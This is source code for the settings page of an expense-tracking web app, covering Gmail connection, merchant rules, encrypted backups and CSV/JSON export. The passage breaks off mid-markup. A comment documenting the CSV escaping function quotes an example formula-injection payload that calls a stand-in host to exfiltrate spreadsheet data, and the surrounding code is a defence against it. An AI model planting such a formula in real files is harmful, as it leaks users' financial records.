// ============================================
// SettingsPage — Application Preferences & Backups
// Manage merchant rules, backups, and localisations
// ============================================

import { APP_CONFIG } from '@/constants'
import { useState, useEffect } from 'react'
import { AppLayout } from '@/layouts'
import { motion, AnimatePresence, useReducedMotion } from 'framer-motion'
import { Card, Button, Input, Select, Modal, EmptyState, ACTION_BUTTON_DANGER } from '@/components/ui'
import {
  getMerchantRules,
  deleteMerchantRule,
  saveMerchantRule,
  supabase,
  fetchMerchantRules,
  saveMerchantRuleToDb,
  migrateLocalStorageRulesToDB
} from '@/services'
import { fetchAllTransactions } from '@/services/transactions'
import { buildRestoreRow, selectRowsToRestore } from '@/services/backupRestore'
import { encryptText, decryptText, formatDate, toISODateLocal, cn } from '@/utils'
import { useAuth } from '@/context/AuthContext'
import { useToast } from '@/context'
import { useCategories } from '@/context/CategoriesContext'
import CategoryManager from '@/components/settings/CategoryManager'
import CardManager from '@/components/settings/CardManager'
import {
  Brain,
  Trash2,
  Lock,
  Download,
  Upload,
  FileSpreadsheet,
  FileJson,
  Key,
  CheckCircle2,
  XCircle,
  HelpCircle,
  Plus,
  Check,
  Mail,
  CreditCard,
  Layers,
  Database,
} from 'lucide-react'

/**
 * Settings is grouped rather than listed. Nine sections in one column read as
 * a wall on a phone, and the previous 7/5 grid only helped above md.
 *
 * The grouping is by what a person came to do, not by which table the data
 * lives in: preferences and categories are both "how the app behaves", the
 * scanner's connection and its learned rules are both "how mail is read", and
 * backup, export and password are all "my data and my account".
 */
const SETTINGS_TABS = [
  { id: 'general',   label: 'Categories', icon: Layers },
  { id: 'cards',     label: 'Cards',      icon: CreditCard },
  { id: 'scanning',  label: 'Scanning',   icon: Mail },
  { id: 'data',      label: 'Data',       icon: Database },
] as const

type SettingsTab = (typeof SETTINGS_TABS)[number]['id']

/**
 * What merchant_rules.auto_approve is written as for a hand-added rule.
 *
 * The column's own default, kept only so the row shape does not change. It is
 * dead data: applyMerchantRulesFromRows returns approval_status 'pending' for
 * every match regardless of it, which is invariant 1 in CLAUDE.md. Do not
 * reintroduce a control for it without changing that invariant first.
 */
const RULE_AUTO_APPROVE_DEFAULT = true

export default function SettingsPage() {
  const { user, hasGoogleToken, disconnectGoogle, signInWithGoogle } = useAuth()
  const { showToast } = useToast()
  const { categories, fallbackCategory } = useCategories()

  const [disconnectLoading, setDisconnectLoading] = useState(false)
  const [connectLoading, setConnectLoading] = useState(false)

  /**
   * Same call shape as PendingPage's handleReconnectGoogle — the one OAuth
   * flow. `true` asks for the Gmail scope; nothing here requests offline
   * access or forces a consent prompt (see CLAUDE.md). On success the browser
   * leaves for Google, so the loading state is only cleared on failure.
   */
  const handleConnectGmail = async () => {
    try {
      setConnectLoading(true)
      const { error } = await signInWithGoogle('/settings', true)
      if (error) throw new Error(error)
    } catch (err) {
      showToast(
        err instanceof Error && err.message ? err.message : 'Failed to redirect to Google.',
        'error'
      )
      setConnectLoading(false)
    }
  }

  const handleDisconnectGmail = async () => {
    setDisconnectLoading(true)
    const { error } = await disconnectGoogle()
    setDisconnectLoading(false)
    if (error) {
      showToast(`Could not fully disconnect Gmail: ${error}`, 'error')
      return
    }
    showToast('Gmail disconnected. We no longer have access to your inbox.', 'success')
  }

  // Merchant Rules State
  const [merchantRules, setMerchantRules] = useState<Record<string, { category: string; autoApprove: boolean; ruleType: string }>>({})
  const [newKeyword, setNewKeyword] = useState('')
  const [newCategory, setNewCategory] = useState('')
  const [newRuleType, setNewRuleType] = useState<'income' | 'expense'>('expense')

  useEffect(() => {
    if (!newCategory && categories.length > 0) {
      setNewCategory(fallbackCategory?.name ?? categories[0].name)
    }
  }, [categories, fallbackCategory, newCategory])

  // Encryption Backup / Restore States
  const [backupPassword, setBackupPassword] = useState('')
  const [restorePassword, setRestorePassword] = useState('')
  const [backupLoading, setBackupLoading] = useState(false)
  const [restoreLoading, setRestoreLoading] = useState(false)
  const [backupSuccess, setBackupSuccess] = useState(false)
  const [restoreSuccess, setRestoreSuccess] = useState(false)
  const [restoreError, setRestoreError] = useState('')
  const [exportLoading, setExportLoading] = useState(false)
  // Both optional. Empty means "no bound on that end", so leaving the pair
  // untouched exports everything — the behaviour the button had before.
  const [exportFrom, setExportFrom] = useState('')
  const [exportTo, setExportTo] = useState('')
  const [exportRangeError, setExportRangeError] = useState('')

  // Change Password States
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [changePasswordLoading, setChangePasswordLoading] = useState(false)
  const [changePasswordSuccess, setChangePasswordSuccess] = useState(false)
  const [changePasswordError, setChangePasswordError] = useState('')

  // Confirmation Modals States
  const [showRestoreConfirmModal, setShowRestoreConfirmModal] = useState(false)
  const [pendingRestoreData, setPendingRestoreData] = useState<any[] | null>(null)

  /**
   * Escape one value for a CSV cell.
   *
   * Beyond the usual double-quote doubling, this defuses CSV formula
   * injection. Merchant and description text arrives from scanned emails, and
   * anyone who knows the user's address can send them one — a merchant named
   * `=HYPERLINK("http://evil/?d="&A1,"Receipt")` is a live formula the moment
   * the exported file is opened in Excel or Sheets, exfiltrating the row it
   * sits next to. Excel treats a cell starting with = + - @ TAB or CR as a
   * formula regardless of the surrounding quotes, so the standard mitigation
   * is to push a leading apostrophe in front, which forces the cell to text.
   */
  const csvCell = (value: unknown) => {
    const raw = value === null || value === undefined ? '' : String(value)
    const defused = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
    return `"${defused.replace(/"/g, '""')}"`
  }

  /**
   * The columns a person actually wants when they open this in a spreadsheet
   * or hand it to an accountant.
   *
   * The export used to emit the raw database row: a UUID primary key, an
   * internal confidence score, an event_type used only by the scanner, and
   * card_last4 — a column the app stopped populating when card data was
   * minimised, so it was always blank. None of that means anything to the
   * person reading the file, and the UUID in column A pushed the date, which
   * is what anyone actually sorts by, into column B.
   *
   * Money In / Money Out rather than credit / debit: those two words are
   * written from the BANK's point of view, and every user who has ever read a
   * statement has had to stop and translate them.
   */
  const exportRow = (t: any) => ({
    Date: t.date,
    Description: t.description || '',
    Merchant: t.merchant || '',
    Category: t.category,
    Amount: t.amount,
    Currency: t.currency || 'INR',
    Direction: t.type === 'credit' ? 'Money In' : 'Money Out',
    'Paid With': t.payment_mode && t.payment_mode !== 'unknown' ? t.payment_mode : '',
    Bank: t.card_issuer || '',
    'Added By': t.source === 'email' ? 'Email scan' : 'Manual entry',
    Status: t.approval_status === 'pending' ? 'Awaiting review' : 'Approved',
  })

  const handlePlainExport = async (format: 'csv' | 'json') => {
    // Caught here rather than returning an empty file: a backwards range
    // matches nothing, and "no transactions found" would send the user looking
    // for a data problem that does not exist.
    if (exportFrom && exportTo && exportFrom > exportTo) {
      setExportRangeError('The "from" date is after the "to" date.')
      return
    }
    setExportRangeError('')
    setExportLoading(true)
    try {
      // Pending transactions are included: an export that silently omits
      // everything still awaiting review is not the "all your data" the
      // Data Portability card promises.
      //
      // The date range is optional — leaving both empty exports everything,
      // which is what the button did before this control existed.
      const { data: txns } = await fetchAllTransactions({
        statuses: ['approved', 'pending'],
        ...(exportFrom ? { dateFrom: exportFrom } : {}),
        ...(exportTo ? { dateTo: exportTo } : {}),
      })
      if (!txns || txns.length === 0) {
        showToast(
          exportFrom || exportTo
            ? 'No transactions found in that date range.'
            : 'No transaction records found to export.',
          'warning'
        )
        return
      }

      const rows = txns.map(exportRow)
      const columns = Object.keys(rows[0]) as (keyof (typeof rows)[0])[]

      // Named after the range it actually covers, so two exports don't land in
      // the Downloads folder as indistinguishable files.
      const rangeLabel = exportFrom || exportTo
        ? `${exportFrom || 'start'}_to_${exportTo || 'today'}`
        : 'all'

      let content = ''
      let mimeType = ''
      let filename = ''

      if (format === 'csv') {
        const header = columns.join(',')
        const body = rows
          .map((row) =>
            columns
              .map((col) =>
                // Amount stays unquoted so spreadsheets keep it numeric;
                // everything else goes through the formula-injection guard.
                col === 'Amount' ? row[col] : csvCell(row[col])
              )
              .join(',')
          )
          .join('\n')
        content = `${header}\n${body}`
        mimeType = 'text/csv;charset=utf-8;'
        filename = `Intrack_Transactions_${rangeLabel}.csv`
      } else {
        content = JSON.stringify(rows, null, 2)
        mimeType = 'application/json;charset=utf-8;'
        filename = `Intrack_Transactions_${rangeLabel}.json`
      }

      const blob = new Blob([content], { type: mimeType })
      const url = URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.setAttribute('href', url)
      link.setAttribute('download', filename)
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
    } catch (err: any) {
      showToast('Failed to export data: ' + err.message, 'error')
    } finally {
      setExportLoading(false)
    }
  }

  /**
   * Load the merchant rules, preferring the database.
   *
   * The localStorage fallback fires only when the database could not be READ —
   * never when it simply returned nothing. It used to key off
   * `data.length > 0`, which cannot tell "this account has no rules" from "the
   * request failed", so deleting your last rule fell through to the browser
   * copy and rules you had just removed reappeared. Rules created on another
   * device made it worse: the local copy is stale by definition, so the list
   * could repopulate with something the account no longer had anywhere.
   *
   * An empty database answer is a real answer. Only a throw is not.
   */
  const loadRules = async () => {
    if (user) {
      const { rules, ok } = await fetchMerchantRules(user.id)
      if (ok) {
        const dbRules: Record<string, { category: string; autoApprove: boolean; ruleType: string }> = {}
        rules.forEach(r => {
          dbRules[r.merchant_key] = { category: r.preferred_category, autoApprove: r.auto_approve, ruleType: r.rule_type }
        })
        setMerchantRules(dbRules)
        return
      }
      // ok === false: the read failed. Showing the last known rules beats
      // showing none while the database is unreachable, so fall through.
    }
    // Signed out, or the database could not be reached.
    const localRules = getMerchantRules()
    const withType: Record<string, { category: string; autoApprove: boolean; ruleType: string }> = {}
    Object.entries(localRules).forEach(([key, rule]) => {
      withType[key] = { ...rule, ruleType: 'expense' }
    })
    setMerchantRules(withType)
  }

  useEffect(() => {
    document.title = `Settings | ${APP_CONFIG.APP_NAME}`
    if (user) {
      // Migrate and then load
      migrateLocalStorageRulesToDB(user.id).finally(() => {
        loadRules()
      })
    } else {
      loadRules()
    }
  }, [user])


  const handleDeleteRule = async (key: string) => {
    deleteMerchantRule(key)
    if (user) {
      try {
        await supabase.from('merchant_rules').delete().eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to delete rule from DB:', err)
      }
    }
    loadRules()
  }

  const handleUpdateRuleCategory = async (key: string, category: string) => {
    const currentRule = merchantRules[key]
    const autoApprove = currentRule ? currentRule.autoApprove : true
    saveMerchantRule(key, category, autoApprove)
    if (user) {
      try {
        await supabase.from('merchant_rules').update({
          preferred_category: category,
          last_updated: new Date().toISOString()
        }).eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to update rule category in DB:', err)
      }
    }
    loadRules()
  }

  const handleUpdateRuleType = async (key: string, ruleType: string) => {
    if (user) {
      try {
        await supabase.from('merchant_rules').update({
          rule_type: ruleType,
          last_updated: new Date().toISOString(),
        }).eq('user_id', user.id).eq('merchant_key', key)
      } catch (err) {
        console.error('Failed to update rule type in DB:', err)
      }
    }
    loadRules()
  }

  const handleAddCustomRule = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!newKeyword.trim()) return

    // auto_approve is written as the column's own default. Nothing reads it —
    // the scanner returns 'pending' for every rule match (CLAUDE.md invariant
    // 1) — so this is here to keep the row shape unchanged, not to grant
    // anything. The control that used to set it is gone.
    saveMerchantRule(newKeyword, newCategory, RULE_AUTO_APPROVE_DEFAULT)
    if (user) {
      try {
        await saveMerchantRuleToDb(user.id, newKeyword, newCategory, RULE_AUTO_APPROVE_DEFAULT, undefined, newRuleType)
      } catch (err) {
        console.error('Failed to save rule to DB:', err)
      }
    }

    setNewKeyword('')
    setNewCategory(fallbackCategory?.name ?? categories[0]?.name ?? '')
    setNewRuleType('expense')
    loadRules()
  }

  const handleBackup = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!backupPassword) return
    setBackupLoading(true)
    setBackupSuccess(false)
    try {
      // Every row, approved and pending alike. A backup that stops at the
      // first page or drops the review queue is data loss the user only finds
      // out about when they try to restore it.
      const { data: txns } = await fetchAllTransactions({ statuses: ['approved', 'pending'] })
      if (!txns || txns.length === 0) {
        showToast('No transaction records found to export.', 'warning')
        setBackupLoading(false)
        return
      }

      const jsonStr = JSON.stringify(txns)
      const encrypted = await encryptText(jsonStr, backupPassword)

      const blob = new Blob([encrypted], { type: 'text/plain;charset=utf-8;' })
      const url = URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.setAttribute('href', url)
      link.setAttribute('download', `Intrack_Encrypted_Backup_${toISODateLocal(new Date())}.drbak`)
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)
      
      setBackupSuccess(true)
      setBackupPassword('')
    } catch (err: any) {
      showToast('Failed to generate encrypted backup: ' + err.message, 'error')
    } finally {
      setBackupLoading(false)
    }
  }

  const handleRestore = async (e: React.FormEvent) => {
    e.preventDefault()
    setRestoreError('')
    setRestoreSuccess(false)

    const fileInput = document.getElementById('restore-file-input') as HTMLInputElement
    const file = fileInput?.files?.[0]
    if (!file) {
      setRestoreError('Please select a .drbak backup file.')
      return
    }
    if (!restorePassword) {
      setRestoreError('Please enter the decryption password.')
      return
    }

    setRestoreLoading(true)
    try {
      const fileText = await file.text()
      const decrypted = await decryptText(fileText.trim(), restorePassword)
      const parsed = JSON.parse(decrypted)

      if (!Array.isArray(parsed)) {
        throw new Error('Backup format is invalid: expected a list of transactions.')
      }

      setPendingRestoreData(parsed)
      setShowRestoreConfirmModal(true)
    } catch (err: any) {
      console.error('Restore error:', err)
      setRestoreError(err.message || 'Decryption failed. Please verify the file and password.')
    } finally {
      setRestoreLoading(false)
    }
  }

  const executeRestore = async () => {
    if (!pendingRestoreData) return
    setRestoreLoading(true)
    try {
      // The dedup set has to cover the whole table. Built from a truncated
      // first page it would miss older transactions and happily re-insert them
      // as duplicates on every restore. Pending rows count too, since the
      // backup now contains them.
      const { data: currentTxns, error: currentErr } = await fetchAllTransactions({
        statuses: ['approved', 'pending'],
      })
      if (currentErr) {
        throw new Error('Could not read your existing transactions, so the merge was cancelled rather than risk creating duplicates.')
      }
      const toInsert = selectRowsToRestore(pendingRestoreData, currentTxns ?? [])

      if (toInsert.length > 0) {
        const cleanTxns = toInsert.map((t) => buildRestoreRow(t, user?.id))

        const { error: insertErr } = await supabase.from('transactions').insert(cleanTxns)
        if (insertErr) throw insertErr
      }

      setRestoreSuccess(true)
      setRestorePassword('')
      const fileInput = document.getElementById('restore-file-input') as HTMLInputElement
      if (fileInput) fileInput.value = ''
      showToast(`Merged ${toInsert.length} new transactions from backup!`, 'success')
    } catch (err: any) {
      console.error('Restore error:', err)
      setRestoreError(err.message || 'Merge failed. Please try again.')
    } finally {
      setRestoreLoading(false)
      setShowRestoreConfirmModal(false)
      setPendingRestoreData(null)
    }
  }

  const handleChangePassword = async (e: React.FormEvent) => {
    e.preventDefault()
    setChangePasswordError('')
    setChangePasswordSuccess(false)

    if (newPassword.length < 6) {
      setChangePasswordError('Password must be at least 6 characters long.')
      return
    }

    if (newPassword !== confirmPassword) {
      setChangePasswordError('Passwords do not match.')
      return
    }

    setChangePasswordLoading(true)

    try {
      const { error } = await supabase.auth.updateUser({
        password: newPassword,
      })

      if (error) {
        setChangePasswordError(error.message)
      } else {
        setChangePasswordSuccess(true)
        setNewPassword('')
        setConfirmPassword('')
        showToast('🔑 Password changed successfully!', 'success')
      }
    } catch (err: any) {
      setChangePasswordError(err.message || 'Failed to change password.')
    } finally {
      setChangePasswordLoading(false)
    }
  }

  const [tab, setTab] = useState<SettingsTab>('general')

  // Motion here is state-carrying only — an indicator that follows the active
  // tab, and one panel handing over to the next. Both collapse to nothing when
  // the visitor has asked for reduced motion.
  const reduceMotion = useReducedMotion()

  return (
    <AppLayout>
      <div className="animate-fade-in">
        {/* Header */}
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-white md:text-3xl">Settings</h1>
          <p className="mt-1.5 text-sm text-zinc-400 max-w-2xl">
            Your categories and cards, how your inbox is read, and what happens to your data.
          </p>
        </div>

        {/* Nav and panel sit side by side from md up — the shape every settings
            screen a user has met uses — and stack on a phone, where a vertical
            rail would eat the whole first screen. Below md the strip scrolls
            sideways and bleeds to the viewport edge so it reads as scrollable. */}
        <div className="mt-6 flex flex-col gap-6 md:mt-8 md:flex-row md:items-start md:gap-8">
          <nav
            role="tablist"
            aria-label="Settings sections"
            className={cn(
              'flex gap-1.5 overflow-x-auto pb-1 -mx-4 px-4 sm:-mx-6 sm:px-6',
              'md:mx-0 md:px-0 md:pb-0 md:flex-col md:overflow-visible',
              'md:w-52 lg:w-56 md:shrink-0 md:sticky md:top-20'
            )}
          >
            {SETTINGS_TABS.map((t) => {
              const Icon = t.icon
              const isActive = tab === t.id
              return (
                <button
                  key={t.id}
                  role="tab"
                  id={`settings-tab-${t.id}`}
                  aria-selected={isActive}
                  aria-controls={`settings-panel-${t.id}`}
                  onClick={() => setTab(t.id)}
                  className={cn(
                    'relative flex items-center gap-2.5 rounded-xl px-3.5 h-11 text-sm font-medium',
                    'whitespace-nowrap cursor-pointer transition-colors md:w-full',
                    'focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500/40',
                    isActive ? 'text-brand-400' : 'text-zinc-400 hover:text-zinc-100 hover:bg-surface-2/70'
                  )}
                >
                  {isActive && (
                    // One indicator that travels to whichever tab is active —
                    // horizontally on a phone, vertically on the rail — instead
                    // of four that blink on and off.
                    <motion.span
                      layoutId="settings-tab-indicator"
                      aria-hidden="true"
                      className="absolute inset-0 rounded-xl bg-brand-500/10 border border-brand-500/30"
                      transition={reduceMotion ? { duration: 0 } : { type: 'spring', stiffness: 420, damping: 36 }}
                    />
                  )}
                  <Icon className="h-4 w-4 shrink-0 relative" />
                  <span className="relative">{t.label}</span>
                </button>
              )
            })}
          </nav>

          {/* One column of sections. The old 7/5 split only ever applied above
              md, and below it produced a single very long scroll. */}
          <div className="min-w-0 flex-1 md:max-w-3xl">
            <AnimatePresence mode="wait" initial={false}>
              <motion.div
                key={tab}
                role="tabpanel"
                id={`settings-panel-${tab}`}
                aria-labelledby={`settings-tab-${tab}`}
                initial={reduceMotion ? false : { opacity: 0, y: 6 }}
                animate={{ opacity: 1, y: 0 }}
                exit={reduceMotion ? { opacity: 1 } : { opacity: 0, y: -6 }}
                transition={{ duration: reduceMotion ? 0 : 0.18, ease: [0.16, 1, 0.3, 1] }}
                className="space-y-6"
              >
          {tab === 'general' && (
            <>
            {/* Manage Categories Card */}
            <CategoryManager />
            </>
          )}

          {tab === 'cards' && <CardManager />}

          {tab === 'scanning' && (
            <>
            {/* Gmail Connection Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-100 mb-1.5 flex items-center gap-2">
                <Mail className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Gmail Inbox Connection</span>
              </h2>
              {/* Connection state is said in words and shown with an icon, never
                  by colour alone. */}
              <p
                className={cn(
                  'mb-3 inline-flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-semibold',
                  hasGoogleToken
                    ? 'bg-[var(--status-positive-subtle)] text-[var(--status-positive-text)]'
                    : 'bg-surface-2 text-zinc-400'
                )}
              >
                {hasGoogleToken
                  ? <><CheckCircle2 className="h-3.5 w-3.5" aria-hidden="true" /> Connected</>
                  : <><XCircle className="h-3.5 w-3.5" aria-hidden="true" /> Not connected</>}
              </p>
              {hasGoogleToken ? (
                <>
                  <p className="text-sm text-zinc-400 mb-4 leading-relaxed">
                    Intrack reads bank transaction alerts from your Gmail when you run a scan,
                    and logs them as expenses for you to approve. Disconnecting revokes our access
                    at Google immediately, so no further scan can run. Your already-imported
                    transactions stay untouched.
                  </p>
                  <Button
                    onClick={handleDisconnectGmail}
                    variant="secondary"
                    className="w-full sm:w-auto justify-center gap-1.5"
                    disabled={disconnectLoading}
                  >
                    <XCircle className="h-4 w-4 shrink-0" />
                    {disconnectLoading ? 'Disconnecting…' : 'Disconnect Gmail'}
                  </Button>
                </>
              ) : (
                <>
                  <p className="text-sm text-zinc-400 mb-4 leading-relaxed">
                    Intrack has no access to your inbox. Connect it to let scans read your bank
                    transaction alerts and log them as expenses for you to approve.
                  </p>
                  <Button
                    onClick={handleConnectGmail}
                    variant="secondary"
                    className="w-full sm:w-auto justify-center gap-1.5"
                    disabled={connectLoading}
                  >
                    <Key className="h-4 w-4 shrink-0" />
                    {connectLoading ? 'Redirecting…' : 'Connect Gmail'}
                  </Button>
                </>
              )}
            </Card>
            {/* Smart Merchant Rules Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-100 mb-1.5 flex items-center gap-2">
                <Brain className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Smart Merchant Rules</span>
              </h2>
              {/* This used to promise that Intrack "auto-approves them when
                  confidence is high", alongside a per-rule Auto-Approve
                  checkbox. Neither was true: applyMerchantRulesFromRows returns
                  approval_status 'pending' for every match regardless of
                  confidence, auto_approve or times_confirmed, which is
                  invariant 1 in CLAUDE.md. The checkbox wrote a column nothing
                  reads, so it was a switch that changed nothing — and it
                  implied a user could turn OFF a protection that is actually
                  unconditional. Both are gone; the copy now says what the
                  scanner does. */}
              <p className="text-sm text-zinc-400 mb-5 leading-relaxed">
                Rules learned from your manual approvals. Intrack applies the category
                automatically to matching transactions — but every one still lands in
                Pending for you to approve. Nothing is ever added to your accounts
                without you.
              </p>

              {/* Inline Rule Creator Form */}
              <form
                onSubmit={handleAddCustomRule}
                className="grid grid-cols-1 gap-3 mb-5 p-4 bg-surface-2/40 border border-border-subtle/40 rounded-xl sm:grid-cols-2"
              >
                <Input
                  label="Keyword"
                  placeholder="e.g. Swiggy"
                  value={newKeyword}
                  onChange={(e) => setNewKeyword(e.target.value)}
                  required
                />
                <Select
                  label="Category"
                  value={newCategory}
                  onChange={(e) => setNewCategory(e.target.value)}
                >
                  {categories.map((cat) => (
                    <option key={cat.id} value={cat.name}>{cat.emoji} {cat.name}</option>
                  ))}
                </Select>
                <Select
                  label="Treat as"
                  value={newRuleType}
                  onChange={(e) => setNewRuleType(e.target.value as 'income' | 'expense')}
                >
                  <option value="expense">🔴 Expense</option>
                  <option value="income">🟢 Income</option>
                </Select>
                <div className="flex items-end">
                  <Button type="submit" block className="gap-1.5">
                    <Plus className="h-4 w-4" /> Add rule
                  </Button>
                </div>
              </form>

              {Object.keys(merchantRules).length === 0 ? (
                <EmptyState
                  icon="🧠"
                  title="No rules yet"
                  description="Approve a pending transaction and Intrack learns the merchant, or add a rule above."
                />
              ) : (
                <ul className="space-y-2 max-h-[420px] overflow-y-auto pr-1">
                  <AnimatePresence initial={false}>
                    {Object.entries(merchantRules).map(([key, rule]) => (
                      <motion.li
                        key={key}
                        layout={!reduceMotion}
                        initial={reduceMotion ? false : { opacity: 0, y: -4 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={reduceMotion ? { opacity: 0 } : { opacity: 0, x: -8 }}
                        transition={{ duration: reduceMotion ? 0 : 0.18, ease: [0.16, 1, 0.3, 1] }}
                        className="flex flex-col gap-3 p-3 rounded-xl bg-surface-2/50 border border-border-subtle/40 transition-colors hover:border-border-hover sm:flex-row sm:items-center sm:gap-2"
                      >
                        <span className="text-sm font-semibold text-zinc-100 capitalize truncate sm:flex-1">
                          {key}
                        </span>
                        <div className="flex items-center gap-2">
                          {/* Select puts className on the <select> and renders
                              its own wrapper, so widths go on the wrapper. */}
                          <div className="flex-1 min-w-0 sm:flex-none sm:w-40">
                            <Select
                              value={rule.category}
                              aria-label={`Category for ${key}`}
                              onChange={(e) => handleUpdateRuleCategory(key, e.target.value)}
                              className="h-10 text-sm"
                            >
                              {categories.map((cat) => (
                                <option key={cat.id} value={cat.name}>{cat.emoji} {cat.name}</option>
                              ))}
                            </Select>
                          </div>
                          <div className="flex-1 min-w-0 sm:flex-none sm:w-32">
                            <Select
                              value={rule.ruleType}
                              aria-label={`Rule type for ${key}`}
                              onChange={(e) => handleUpdateRuleType(key, e.target.value)}
                              className="h-10 text-sm"
                            >
                              <option value="expense">🔴 Expense</option>
                              <option value="income">🟢 Income</option>
                            </Select>
                          </div>
                          <button
                            onClick={() => handleDeleteRule(key)}
                            className={`${ACTION_BUTTON_DANGER} shrink-0`}
                            title="Delete rule"
                            aria-label={`Delete rule for ${key}`}
                          >
                            <Trash2 className="h-4 w-4" />
                          </button>
                        </div>
                      </motion.li>
                    ))}
                  </AnimatePresence>
                </ul>
              )}
            </Card>
            </>
          )}


          {tab === 'data' && (
            <>
            {/* Encrypted Backup & Restore Card */}
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-100 mb-1.5 flex items-center gap-2">
                <Lock className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Privacy-First Encrypted Backup</span>
              </h2>
              <p className="text-sm text-zinc-400 mb-6 leading-relaxed">
                Securely export or restore your transactions locally. Every transaction is included — approved ones and anything still waiting in Pending. All backups are encrypted client-side using industry-standard <strong className="font-semibold text-zinc-200">AES-256-GCM</strong> before downloading.
              </p>

              <div className="space-y-6">
                {/* Export Block */}
                <div className="space-y-4">
                  <h3 className="text-xs font-bold text-zinc-300 uppercase tracking-wider">Download Backup</h3>
                  <form onSubmit={handleBackup} className="space-y-3">
                    {backupSuccess && (
                      <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-3 text-sm text-[var(--status-positive-text)] leading-relaxed animate-fade-in flex items-start gap-2">
                        <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                        <span>Encrypted backup generated and downloaded successfully.</span>
                      </div>
                    )}
                    <Input
                      label="Backup Password"
                      type="password"
                      placeholder="Enter a strong password"
                      value={backupPassword}
                      onChange={(e) => setBackupPassword(e.target.value)}
                      required
                    />
                    <Button type="submit" block size="sm" loading={backupLoading} disabled={backupLoading} className="gap-1.5">
                      <Download className="h-4 w-4" /> Encrypt & Export Backup
                    </Button>
                  </form>
                </div>

                {/* Import Block */}
                <div className="space-y-4 border-t border-border-subtle/30 pt-6">
                  <h3 className="text-xs font-bold text-zinc-300 uppercase tracking-wider">Restore Backup</h3>
                  <form onSubmit={handleRestore} className="space-y-3">
                    {restoreError && (
                      <div className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-3 text-sm text-[var(--status-danger-text)] leading-relaxed flex items-start gap-2">
                        <XCircle className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-danger-text)]" />
                        <span>{restoreError}</span>
                      </div>
                    )}
                    {restoreSuccess && (
                      <div className="rounded-xl bg-[var(--status-positive-subtle)] border border-[var(--status-positive-border)] p-3 text-sm text-[var(--status-positive-text)] leading-relaxed animate-fade-in flex items-start gap-2">
                        <CheckCircle2 className="h-4 w-4 shrink-0 mt-0.5 text-[var(--status-positive-text)]" />
                        <span>Backup successfully decrypted and data merged!</span>
                      </div>
                    )}
                    <div>
                      <label htmlFor="restore-file-input" className="block text-sm font-medium text-zinc-300 mb-1.5 cursor-pointer">
                        Backup file (.drbak)
                      </label>
                      <input
                        id="restore-file-input"
                        type="file"
                        accept=".drbak"
                        className="w-full text-sm text-zinc-400 rounded-lg border border-border-default bg-surface-1 p-2
                          file:mr-3 file:py-2 file:px-3.5 file:rounded-lg file:border-0 file:text-sm file:font-semibold
                          file:bg-surface-2 file:text-zinc-200 hover:file:bg-surface-3 file:cursor-pointer cursor-pointer
                          focus-within:ring-2 focus-within:ring-brand-500/30 focus-within:border-brand-500"
                      />
                    </div>
                    <Input
                      label="Decryption Password"
                      type="password"
                      placeholder="Enter decryption password"
                      value={restorePassword}
                      onChange={(e) => setRestorePassword(e.target.value)}
                      required
                    />
                    <Button variant="secondary" type="submit" block loading={restoreLoading} disabled={restoreLoading} className="gap-1.5">
                      <Upload className="h-4 w-4" /> Decrypt & Merge Backup
                    </Button>
                  </form>
                </div>
              </div>
            </Card>
            <Card className="border-border-subtle bg-surface-1 shadow-md">
              <h2 className="text-base font-bold text-zinc-100 mb-1.5 flex items-center gap-2">
                <Download className="h-5 w-5 text-brand-400 shrink-0" />
                <span>Data Portability (Plain Export)</span>
              </h2>
              <p className="text-sm text-zinc-400 mb-5 leading-relaxed">
                Export your transactions — approved and pending — in standard, human-readable formats for tax filing, spreadsheets, or migrations.
              </p>

              <div className="grid grid-cols-1 gap-3 mb-3 sm:grid-cols-2">
                <Input
                  label="From"
                  id="export-from"
                  type="date"
                  value={exportFrom}
                  max={exportTo || undefined}
                  onChange={(e) => { setExportFrom(e.target.value); setExportRangeError('') }}
                />
                <Input
                  label="To"
                  id="export-to"
                  type="date"
                  value={exportTo}
                  min={exportFrom || undefined}
                  onChange={(e) => { setExportTo(e.target.value); setExportRangeError('') }}
                />
              </div>

              {exportRangeError && (
                <div role="alert" className="rounded-xl bg-[var(--status-danger-subtle)] border border-[var(--status-danger-border)] p-3 mb-3 text-sm text-[var(--status-danger-text)]">
                  {exportRangeError}
                </div>
              )}

              <div className="flex flex-wrap items-center justify-between gap-2 mb-4">
                <p className="text-sm text-zinc-400">
                  {exportFrom || exportTo
                    ? `Exporting ${exportFrom ? formatDate(exportFrom) : 'the beginning'} → ${exportTo ? formatDate(exportTo) : 'today'}`
                    : 'Leave both blank to export everything'}
                </p>
                {(exportFrom || exportTo) && (
                  <button
                    onClick={() => { setExportFrom(''); setExportTo(''); setExportRangeError('') }}
                    className="text-sm font-medium text-brand-400 underline underline-offset-2 bg-transparent border-none cursor-pointer shrink-0 rounded focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-brand-500/40"
                  >
                    Clear
                  </button>
                )}
              </div>

              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
                <Button
                  onClick={() => handlePlainExport('csv')}
                  variant="secondary"
